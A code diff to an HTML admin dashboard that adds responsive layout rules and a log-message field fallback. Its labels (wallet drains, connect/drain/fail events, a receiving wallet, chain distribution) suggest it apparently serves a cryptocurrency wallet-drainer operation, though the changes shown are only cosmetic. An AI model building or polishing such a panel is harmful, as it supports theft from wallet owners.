@@ -250,17 +250,45 @@
     .tw-val{font-size:14px;font-weight:700;color:var(--green);font-family:'Space Grotesk',sans-serif}
 
     /* ── MOBILE ── */
-    @media(max-width:900px){.stats-row{grid-template-columns:repeat(2,1fr)}}
+    @media(max-width:1200px){
+      #dash-mid{grid-template-columns:1fr 1fr!important}
+      #dash-bot{grid-template-columns:1fr 1fr!important}
+    }
+    @media(max-width:900px){
+      .stats-row{grid-template-columns:repeat(2,1fr)}
+      #dash-mid{grid-template-columns:1fr!important}
+      #dash-bot{grid-template-columns:1fr!important}
+      .page-head h1{font-size:18px}
+      .scard-val{font-size:22px}
+    }
     @media(max-width:768px){
       .layout{grid-template-columns:1fr}
       .sidebar{position:fixed;left:-260px;top:0;z-index:90;height:100vh;transition:left .3s ease;box-shadow:8px 0 40px rgba(0,0,0,.5);width:250px}
       .sidebar.open{left:0}
       .mobile-btn{display:flex!important}
-      .main{padding:16px}
+      .main{padding:14px 10px}
       .stats-row{grid-template-columns:1fr 1fr}
       .form-row{grid-template-columns:1fr}
-      .qa-grid{grid-template-columns:1fr 1fr}
+      .qa-grid{grid-template-columns:repeat(3,1fr)}
       #dash-mid{grid-template-columns:1fr!important}
+      #dash-bot{grid-template-columns:1fr!important}
+      .card-body{padding:14px}
+      .card-head{padding:12px 14px}
+      .login-box{width:92%;padding:36px 24px}
+      .login-box h1{font-size:22px}
+      .modal{padding:20px;border-radius:16px}
+      table{font-size:11px}
+      th,td{padding:10px 10px}
+      .page-head-row{flex-direction:column;gap:8px}
+    }
+    @media(max-width:480px){
+      .stats-row{grid-template-columns:1fr}
+      .qa-grid{grid-template-columns:1fr 1fr}
+      .scard{padding:14px}
+      .scard-val{font-size:20px}
+      .scard-icon{width:32px;height:32px;font-size:14px;margin-bottom:10px}
+      .gas-grid{grid-template-columns:1fr}
+      #config-grid{grid-template-columns:1fr!important}
     }
     .mobile-btn{display:none;position:fixed;top:14px;left:14px;z-index:95;background:var(--surface);border:1px solid var(--border2);border-radius:10px;padding:9px 12px;cursor:pointer;font-size:16px}
   </style>
@@ -376,7 +404,7 @@
       </div>
 
       <!-- Mid Row: Success Rate + Chain Distribution + Quick Actions -->
-      <div style="display:grid;grid-template-columns:280px 1fr 220px;gap:16px;margin-bottom:18px" id="dash-mid">
+      <div style="display:grid;grid-template-columns:280px 1fr 240px;gap:16px;margin-bottom:18px" id="dash-mid">
         <!-- Success Rate Donut -->
         <div class="card">
           <div class="card-head"><span class="card-title">Success Rate</span></div>
@@ -415,7 +443,7 @@
       </div>
 
       <!-- Bottom Row: Recent + Top Wallets + Activity -->
-      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px" id="dash-bot">
+      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px" id="dash-bot">
         <!-- Recent Wallets -->
         <div class="card">
           <div class="card-head"><span class="card-title">Recent Wallets</span><span style="font-size:10px;color:var(--muted)" id="dash-last-seen"></span></div>
@@ -508,7 +536,7 @@
     <!-- ══════ CONFIG ══════ -->
     <div id="page-config" class="page">
       <div class="page-head"><h1>Configuration</h1><p>Wallet, password, and system settings</p></div>
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+      <div id="config-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
         <div class="card">
           <div class="card-head"><span class="card-title">Receiving Wallet</span></div>
           <div class="card-body">
@@ -666,7 +694,8 @@ function renderDashboard() {
     : '<div class="timeline">'+logs.map(l => {
       const cls = l.level==='error'?'fail':l.level==='warn'?'drain':'connect'
       const icon = l.level==='error'?'&#10007;':l.level==='warn'?'&#9889;':'&#8226;'
-      return `<div class="tl-item"><div class="tl-dot ${cls}">${icon}</div><div class="tl-body"><div class="tl-msg">${l.msg.length>80?l.msg.slice(0,80)+'...':l.msg}</div><div class="tl-time">${l.time.split('T')[1]?.split('.')[0]||''}</div></div></div>`
+      const msg = l.message||l.msg||''
+      return `<div class="tl-item"><div class="tl-dot ${cls}">${icon}</div><div class="tl-body"><div class="tl-msg">${msg.length>80?msg.slice(0,80)+'...':msg}</div><div class="tl-time">${l.time.split('T')[1]?.split('.')[0]||''}</div></div></div>`
     }).join('')+'</div>'
 }
 
@@ -702,7 +731,7 @@ function renderDrains() {
 function renderLogs() {
   const logs=dashData.logs||[]; document.getElementById('log-count').textContent=logs.length+' entries'
   document.getElementById('log-box').innerHTML = logs.length===0 ? '<div style="color:var(--muted2)">No logs...</div>'
-    : logs.map(l=>`<div class="log-entry"><span class="log-ts">${l.time.replace('T',' ').split('.')[0]}</span><span class="log-level-${l.level}">[${l.level.toUpperCase()}]</span><span class="log-msg"> ${l.msg}</span></div>`).join('')
+    : logs.map(l=>`<div class="log-entry"><span class="log-ts">${l.time.replace('T',' ').split('.')[0]}</span><span class="log-level-${l.level}">[${l.level.toUpperCase()}]</span><span class="log-msg"> ${l.message||l.msg||''}</span></div>`).join('')
 }
 
 async function loadGas() {
